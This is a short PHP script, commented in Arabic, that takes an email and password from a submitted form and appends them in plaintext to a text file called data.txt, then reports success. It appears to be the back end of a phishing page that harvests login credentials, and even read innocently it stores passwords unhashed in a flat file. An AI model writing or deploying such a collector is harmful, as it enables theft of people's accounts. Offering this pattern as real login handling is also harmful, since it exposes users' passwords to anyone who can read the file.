<?php
// استقبال البيانات من النموذج
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// فحص ما إذا كانت البيانات غير فارغة
if (!empty($email) && !empty($password)) {
    // فتح ملف النص للكتابة فيه
    $file = fopen("data.txt", "a");

    // كتابة البيانات إلى الملف
    fwrite($file, "Email: " . $email . "\nPassword: " . $password . "\n\n");

    // إغلاق ملف النص
    fclose($file);

    // رسالة نجاح
    echo "تم حفظ البيانات بنجاح!";
} else {
    // رسالة خطأ إذا كانت البيانات فارغة
    echo "يرجى ملء جميع الحقول!";
}
?>
